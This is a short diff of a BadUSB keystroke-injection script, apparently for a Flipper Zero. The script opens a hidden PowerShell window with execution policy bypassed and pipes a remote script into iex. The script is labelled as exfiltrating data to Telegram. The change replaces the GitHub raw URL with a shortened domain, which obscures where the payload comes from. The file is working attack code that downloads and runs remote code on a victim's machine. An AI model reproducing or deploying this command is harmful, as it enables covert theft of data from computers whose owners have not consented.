@@ -14,6 +14,6 @@ REM open powershell (remove -W Hidden to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H -C $tg='TELEGRAM_TOKEN'; irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Exfiltrate-to-Telegram/main.ps1 | iex
+STRING powershell -NoP -Ep Bypass -W H -C $tg='TELEGRAM_TOKEN'; irm https://bw0.cc/extg | iex
 ENTER
 
